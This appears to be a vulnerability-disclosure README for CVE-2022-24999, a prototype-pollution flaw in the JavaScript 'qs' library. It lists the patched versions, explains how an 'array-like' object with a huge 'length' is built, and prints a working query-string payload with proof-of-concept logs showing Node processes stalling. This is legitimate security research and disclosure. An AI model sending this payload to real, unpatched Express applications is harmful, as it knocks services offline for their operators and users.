# CVE-2022-24999

This repository contain exploits samples of the vulnerability we found in the JS library "qs" in december 2021. 

* This vulnerability was fixed in express v4.17.3 & [qs v6.10.3 v6.9.7, v6.8.3, v6.7.3, v6.6.1, v6.5.3, v6.4.1, v6.3.3, and v6.2.4](https://github.com/ljharb/qs/pull/428).

## qs Array & String Bombs

Vulnerable versions of "qs" allow creating "__proto__" properties on the output JS objects.

By setting an Array in the “__ proto__” property, we’ve been able to create “array-like” objects.

As the resulting Objects inherit the “Array” prototype, they expose the native Array functions.

But as they still are Objects, “qs” allow setting the “length” property on them.

As an example, the following payload will create this kind of “evil” array :

    categories[_proto__]&categories[_proto__]&categories[length]=100000000

Thus, setting an unreasonable "length" value on them will freeze the node process as soon as it tries to convert them to string values or by calling most native Array functions.

This exposes any Node application using a vulnerable version of "qs", with the default Express configuration and without a strong validation system to applicative DOS attacks.

Here an example logs of the poc in ./express-qs-string-bomb :

```
Send payload :  someString[_proto__]&someString[_proto__]&someString[length]=100000000
[server] Received params  { someString: Array { length: '100000000' } }
[server] Run someString + 0
[server] someString + 0 : 6.364s
[server] Run someString == "123" 
[server] someString == "123" : 6.387s
[server] just write `Got ${someString}`
[server] just write `Got ${someString}` : 6.397s
```

## Others exploitable behaviors

Our analysis also allowed us to see that other modes of exploitation were possible.

We describe some of them in the ./qs-vulns directory.

# Credits

BRAUN Nathanael & BRISSAUD Johan<br/>
For EY Security, France
